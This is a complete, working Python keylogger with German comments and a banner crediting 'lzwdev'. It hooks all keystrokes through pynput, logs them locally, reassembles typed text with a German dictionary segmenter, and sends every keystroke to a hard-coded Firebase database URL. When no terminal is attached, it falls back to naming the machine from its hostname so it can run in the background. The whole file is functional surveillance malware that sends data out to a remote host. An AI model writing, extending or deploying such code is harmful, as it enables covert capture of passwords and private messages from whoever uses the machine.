import os
import re
import json
import datetime
import threading
from pathlib import Path

import requests
from pynput import keyboard

# ---------------------------------------------------------------
# BANNER
# ---------------------------------------------------------------
print("╔═══════════════════════════════════════╗")
print("║  KeyLogger by lzwdev                  ║")
print("║  Last update: 5. November 2026        ║")
print("╚═══════════════════════════════════════╝")

# ---------------------------------------------------------------
# KONFIG
# ---------------------------------------------------------------
DB_URL = "https://data-df966-default-rtdb.europe-west1.firebasedatabase.app"

CONFIG_DIR  = Path.home() / ".macbook_keylogger"
CONFIG_FILE = CONFIG_DIR / "config.json"
LOG_DIR     = Path.home() / "Documents" / "KeyLogs"

# Ordner dieses Skripts (dort liegt wordlist-german.txt)
SCRIPT_DIR  = Path(__file__).resolve().parent
WORDLIST_FILE = SCRIPT_DIR / "wordlist-german.txt"

# Namensregeln: nur a-z, A-Z, 0-9
NAME_PATTERN = re.compile(r"^[A-Za-z0-9]+$")
NAME_MIN_LEN = 1
NAME_MAX_LEN = 40

# Zeitfenster für intelligente Texterkennung
SMART_PAUSE_SEC      = 1.8     # Pause zwischen Tasten -> neuer Block
SMART_MAX_BLOCK_SEC  = 90.0    # max. Blockdauer, danach Zwischenspeichern
SMART_WORD_GAP_SEC   = 0.38    # Pause -> Wortgrenze im Text
SMART_MIN_TEXT_LEN   = 2       # min. Zeichen für einen Block


# ---------------------------------------------------------------
# 1) MacBook-Name
# ---------------------------------------------------------------
def is_valid_name(name: str) -> bool:
    return (
        NAME_MIN_LEN <= len(name) <= NAME_MAX_LEN
        and bool(NAME_PATTERN.match(name))
    )


def ask_name_interactive() -> str:
    print()
    print("Name des MacBooks:")
    print("  • nur Buchstaben (a-z, A-Z) und Zahlen (0-9)")
    print("  • keine Umlaute (ä ö ü ß), keine Sonderzeichen, keine Leerzeichen")
    print(f"  • Länge: {NAME_MIN_LEN}–{NAME_MAX_LEN} Zeichen")
    print()
    while True:
        raw = input("Name: ").strip()
        if not raw:
            print("[!] Darf nicht leer sein.\n")
            continue
        if not is_valid_name(raw):
            print("[!] Ungültig. Nur a-z, A-Z und 0-9 erlaubt.\n")
            continue
        return raw


def load_or_ask_macbook_name():
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)

    if CONFIG_FILE.exists():
        try:
            name = json.loads(CONFIG_FILE.read_text(encoding="utf-8")).get("macbook_name")
            if name and is_valid_name(name):
                print(f"[i] MacBook-Name: {name}")
                return name
            if name:
                print(f"[!] Gespeicherter Name ungültig: {name!r} – wird neu abgefragt.")
        except Exception:
            print("[!] config.json konnte nicht gelesen werden – wird neu erstellt.")

    # Hintergrundstart ohne TTY -> Fallback aus Hostname
    if not os.isatty(0):
        import socket
        hostname = re.sub(r"[^A-Za-z0-9]", "", socket.gethostname()) or "MacBook"
        hostname = hostname[:NAME_MAX_LEN]
        CONFIG_FILE.write_text(
            json.dumps({"macbook_name": hostname}, indent=2), encoding="utf-8"
        )
        print(f"[i] Kein Terminal – Fallback-Name gesetzt: {hostname}")
        return hostname

    name = ask_name_interactive()
    CONFIG_FILE.write_text(
        json.dumps({"macbook_name": name}, indent=2), encoding="utf-8"
    )
    print(f"[✓] Gespeichert: {CONFIG_FILE}")
    return name


# ---------------------------------------------------------------
# 2) Wörterbuch laden + intelligente Segmentierung
# ---------------------------------------------------------------
def normalize_word(w: str) -> str:
    w = w.lower()
    return (w.replace("ä", "a").replace("ö", "o")
             .replace("ü", "u").replace("ß", "ss"))


class GermanDictionary:
    """
    Lädt wordlist-german.txt (eine Wortform pro Zeile).
    Bietet:
      - contains(wort)       -> bool (exakt, lowercase)
      - dp_segment(text)     -> versucht, eine zusammengeklebte Zeichenkette
                                mit Dynamischer Programmierung in bekannte
                                Wörter zu zerlegen.
    """

    def __init__(self, path: Path):
        self.words = set()
        self.words_norm = set()
        self.max_len = 0
        self._load(path)

    def _load(self, path: Path):
        if not path.is_file():
            print(f"[!] Wörterbuch nicht gefunden: {path}")
            print("    Intelligente Texterkennung läuft ohne Wörterbuch weiter.")
            return
        print(f"[i] Lade Wörterbuch: {path.name} …", end="", flush=True)
        try:
            with path.open("r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    w = line.strip()
                    if not w:
                        continue
                    lw = w.lower()
                    self.words.add(lw)
                    self.words_norm.add(normalize_word(lw))
                    if len(lw) > self.max_len:
                        self.max_len = len(lw)
            print(f" {len(self.words)} Wörter.")
        except Exception as e:
            print(f" Fehler: {e}")

    def contains(self, w: str) -> bool:
        return w.lower() in self.words or normalize_word(w) in self.words_norm

    def dp_segment(self, text: str, max_word_len: int = 25) -> str:
        """
        Zerlegt einen zusammengeklebten String (ohne Leerzeichen) in Wörter
        aus dem Wörterbuch. Liefert den Text mit eingefügten Leerzeichen.
        Wenn keine sinnvolle Zerlegung gefunden wird, bleibt der Originaltext.
        """
        if not text:
            return ""
        if " " in text:
            return re.sub(r"\s+", " ", text).strip()

        # Kein Wörterbuch geladen? -> Fallback
        if not self.words:
            return text

        n = len(text)
        INF = float("inf")
        dp = [INF] * (n + 1)
        prev = [-1] * (n + 1)
        dp[0] = 0.0

        for i in range(1, n + 1):
            # echte Wörter bis max_word_len Zeichen
            for j in range(max(0, i - max_word_len), i):
                word = text[j:i]
                if self.contains(word):
                    # Kosten: 1 pro Wort + kleine Strafe für sehr lange Wörter
                    cost = dp[j] + 1.0 + max(0, len(word) - 12) * 0.05
                    if cost < dp[i]:
                        dp[i] = cost
                        prev[i] = j
            # Einzelzeichen als teurer Fallback (3 statt 1)
            single_cost = dp[i - 1] + 3.0
            if single_cost < dp[i]:
                dp[i] = single_cost
                prev[i] = i - 1

        if prev[n] == -1:
            return text  # nichts zerlegbar

        parts = []
        i = n
        while i > 0:
            j = prev[i]
            parts.append(text[j:i])
            i = j
        parts.reverse()

        # Einzelzeichen an vorheriges Wort hängen (außer am Anfang)
        merged = []
        for p in parts:
            if len(p) == 1 and merged and len(merged[-1]) > 1:
                merged[-1] += p
            else:
                merged.append(p)

        # Ersten Buchstaben groß, wenn es ein bekanntes Wort ist
        out = []
        for idx, w in enumerate(merged):
            if idx == 0 and self.contains(w):
                w = w[0].upper() + w[1:]
            out.append(w)
        return " ".join(out)


# ---------------------------------------------------------------
# 3) Logger (lokal + Smart-Text + Firebase)
# ---------------------------------------------------------------
class KeyLogger:
    def __init__(self, macbook_name: str, dictionary: GermanDictionary):
        self.macbook_name = macbook_name
        self.dict = dictionary
        self.lock = threading.Lock()

        LOG_DIR.mkdir(parents=True, exist_ok=True)
        self.today = datetime.date.today().isoformat()

        # Roh-Log pro Taste
        self.log_file = LOG_DIR / f"keys_{macbook_name}_{self.today}.log"
        # Zusätzliche Datei mit intelligent erkannten Texten
        self.text_file = LOG_DIR / f"text_{macbook_name}_{self.today}.log"

        self.fb_path = f"{DB_URL}/logs/{macbook_name}/{self.today}.json"
        self.session = requests.Session()

        # Smart-Block-Zustand
        self._block_start = None
        self._block_last_ts = None
        self._block_chars = []   # list[(char, ts, special)]

    # ---------- Roh-Tasten ----------
    def log_key(self, key_repr: str, event_type: str = "press"):
        now = datetime.datetime.now()
        payload = {
            "time": now.strftime("%H:%M:%S"),
            "second": now.second,
            "timestamp": now.isoformat(timespec="seconds"),
            "key": key_repr,
            "event": event_type,
            "macbook": self.macbook_name,
        }

        with self.lock:
            with self.log_file.open("a", encoding="utf-8") as f:
                f.write(json.dumps(payload, ensure_ascii=False) + "\n")

        try:
            r = self.session.post(self.fb_path, json=payload, timeout=5)
            if r.status_code >= 300:
                print(f"[!] Firebase {r.status_code}: {r.text[:120]}")
        except Exception as e:
            print(f"[!] Firebase-Fehler: {e}")

        # An Smart-Block weiterreichen
        if event_type == "press":
            self._feed_smart(key_repr, now.timestamp())

        return payload

    # ---------- Intelligente Texterkennung ----------
    def _feed_smart(self, key_repr: str, ts: float):
        # Blockende bei Pause oder Überschreitung
        if self._block_start is not None and (
            ts - self._block_last_ts > SMART_PAUSE_SEC
            or ts - self._block_start > SMART_MAX_BLOCK_SEC
        ):
            self._flush_smart()

        if self._block_start is None:
            self._block_start = ts

        self._block_last_ts = ts

        # Taste in Zeichen umwandeln
        if key_repr.startswith("Key."):
            code = key_repr[4:]
            if code == "space":
                self._block_chars.append((" ", ts, False))
            elif code in ("enter", "return"):
                self._block_chars.append(("\n", ts, False))
                self._flush_smart()   # Zeilenumbruch beendet Block
            elif code == "tab":
                self._block_chars.append(("\t", ts, False))
            elif code in ("backspace", "delete"):
                if self._block_chars:
                    self._block_chars.pop()
            elif code in ("esc", "escape"):
                self._flush_smart()
            else:
                # andere Sondertasten als Token
                self._block_chars.append((f"[{code.upper()}]", ts, True))
        else:
            ch = key_repr.strip("'")
            if len(ch) == 1:
                self._block_chars.append((ch, ts, False))
            else:
                self._block_chars.append((f"[{ch}]", ts, True))

    def _flush_smart(self):
        if self._block_start is None or not self._block_chars:
            self._block_start = None
            self._block_chars = []
            return

        # Rohtext bauen (Sondertasten bleiben als Token drin, damit sie sichtbar
        # sind – für die DP-Segmentierung werden sie als Trenner behandelt)
        raw_plain = "".join(ch for ch, _, special in self._block_chars if not special)
        raw_full  = "".join(ch for ch, _, _ in self._block_chars)

        # Intelligente Segmentierung nur auf plain-Text
        # Sondertasten werden als Leerzeichen-Ersatz behandelt
        segments = []
        for ch, ts, special in self._block_chars:
            if special:
                segments.append(" ")  # Trenner
            else:
                segments.append(ch)
        candidate = "".join(segments).strip()

        smart_text = self.dict.dp_segment(candidate) if candidate else ""

        # Wenn nichts Brauchbares rauskam: Originaltext (mit Tokens) nehmen
        if not smart_text or len(smart_text.replace(" ", "")) < SMART_MIN_TEXT_LEN:
            smart_text = raw_full.strip()

        if not smart_text:
            self._block_start = None
            self._block_chars = []
            return

        # In Textdatei schreiben (JSON Lines)
        entry = {
            "start": datetime.datetime.fromtimestamp(self._block_start).isoformat(timespec="seconds"),
            "end":   datetime.datetime.fromtimestamp(self._block_last_ts).isoformat(timespec="seconds"),
            "raw":   raw_full,
            "text":  smart_text,
            "keys":  len(self._block_chars),
        }
        with self.lock:
            with self.text_file.open("a", encoding="utf-8") as f:
                f.write(json.dumps(entry, ensure_ascii=False) + "\n")

        print(f"[TEXT] {smart_text}")

        self._block_start = None
        self._block_chars = []

    def flush(self):
        """Am Programmende den aktuellen Block noch schreiben."""
        self._flush_smart()


# ---------------------------------------------------------------
# 4) Tastatur-Handler
# ---------------------------------------------------------------
def make_handlers(logger: KeyLogger):
    def on_press(key):
        try:
            kr = key.char
        except AttributeError:
            kr = str(key)
        logger.log_key(kr, "press")
        # Konsolenausgabe wie vorher, aber kompakt
        print(f"[{datetime.datetime.now():%H:%M:%S}] {kr}")

    def on_release(key):
        try:
            kr = key.char
        except AttributeError:
            kr = str(key)
        logger.log_key(kr, "release")
        if key == keyboard.Key.esc:
            logger.flush()
            print("\n[✓] Stop.")
            return False

    return on_press, on_release


# ---------------------------------------------------------------
# 5) Main
# ---------------------------------------------------------------
def main():
    name = load_or_ask_macbook_name()

    # Wörterbuch aus dem Skript-Ordner laden
    dictionary = GermanDictionary(WORDLIST_FILE)
    logger = KeyLogger(name, dictionary)

    print(f"[i] Lokal:     {logger.log_file}")
    print(f"[i] Texte:     {logger.text_file}")
    print(f"[i] Firebase:  {logger.fb_path}")
    print(f"[i] Wörterbuch: {WORDLIST_FILE.name} ({len(dictionary.words)} Wörter)")
    print("Läuft … ESC beendet.\n")

    on_press, on_release = make_handlers(logger)
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    finally:
        logger.flush()


if __name__ == "__main__":
    main()
